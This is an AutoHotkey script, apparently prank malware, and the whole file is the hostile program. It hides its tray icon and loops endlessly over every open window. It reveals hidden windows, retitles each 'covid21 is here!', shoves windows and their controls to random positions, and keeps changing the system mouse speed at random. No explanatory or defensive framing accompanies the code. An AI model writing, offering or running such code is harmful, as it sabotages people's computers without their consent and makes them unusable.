#Persistent
#NoTrayIcon

SetBatchLines -1
SetWorkingDir, %A_ScriptDir%

SetTimer, mouse, -400

Sleep 5
loop
{
	i := Ceil(0.01*%A_Index%)
	if (%A_Index% > 50) {
		DetectHiddenWindows, On
	}
	winget, winlist, list
	loop, %winlist%
	{
		wid := winlist%A_Index%
		WinShow, ahk_id %wid%
		WinGet, conlist, ControlList, ahk_id %wid%
		WinSetTitle, ahk_id %wid%,, covid21 is here!
		WinGetPos, wX, wY,,, ahk_id %wid%
		Random, rX, -25, 25
		Random, rY, -25, 25
		WinMove, ahk_id %wid%,, wX+rX, wY+rY
		Loop, Parse, conlist, `n, `r
		{
			ControlGetPos, cX, cY, cW, cH, %A_LoopField%, ahk_id %wid%
			Random, rX, -10, 10
			Random, rY, -10, 10
			ControlMove, %A_LoopField%, cX+rX, cY+rY,,, ahk_id %wid%
		}
	}
}
mouse:
Random, speed, 1, 20
DllCall("SystemParametersInfo", UInt, 0x71, UInt, 0, Ptr, %speed%, UInt, 0)
Random, wait, -250, -50
SetTimer, mouse, %wait%
return
